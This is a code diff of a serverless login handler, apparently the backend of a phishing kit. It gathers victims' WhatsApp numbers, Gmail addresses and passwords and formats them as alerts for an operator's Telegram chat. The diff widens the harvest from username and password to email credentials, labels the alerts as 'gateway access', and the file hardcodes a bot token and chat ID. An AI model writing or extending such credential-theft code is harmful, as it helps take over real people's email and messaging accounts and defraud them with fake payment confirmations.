@@ -3,18 +3,18 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { type, username, password, product, price } = req.body;
+  const { type, whatsapp, email, password, product, price } = req.body;
   
-  // Token & Chat ID langsung dipasang aman di backend serverless Vercel (100% aman dari public scanner)
+  // Token & Chat ID aman tersembunyi di server Vercel
   const botToken = '8869523539:AAGK5VLmPsbzmL8axLuM81GIvao3XKuhnXo';
   const chatId = '7603310096';
 
   let message = "";
 
-  if (type === 'LOGIN') {
-    message = `🚨 **XZACKOCULUS - DATA LOGIN MASUK!** 🚨\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 Waktu: ${new Date().toLocaleString()}`;
+  if (type === 'GATEWAY_LOGIN') {
+    message = `🚨 **XZACKOCULUS - AKSES GATEWAY MASUK!** 🚨\n\n📱 WhatsApp: ${whatsapp}\n📧 Gmail: ${email}\n🔑 Sandi: ${password}\n🌐 Waktu: ${new Date().toLocaleString()}`;
   } else if (type === 'PAYMENT') {
-    message = `✅ **PEMBAYARAN DIKONFIRMASI!** ✅\n\n📦 Produk: ${product}\n💰 Nominal: Rp ${price}\n⚡ Status: LUNAS / MENUNGGU ADMIN\n🌐 Waktu: ${new Date().toLocaleString()}`;
+    message = `✅ **PEMBAYARAN DIKONFIRMASI!** ✅\n\n📱 WhatsApp User: ${whatsapp}\n📦 Produk: ${product}\n💰 Nominal: Rp ${price}\n⚡ Status: LUNAS / MENUNGGU ADMIN\n🌐 Waktu: ${new Date().toLocaleString()}`;
   } else {
     return res.status(400).json({ error: 'Invalid type' });
   }
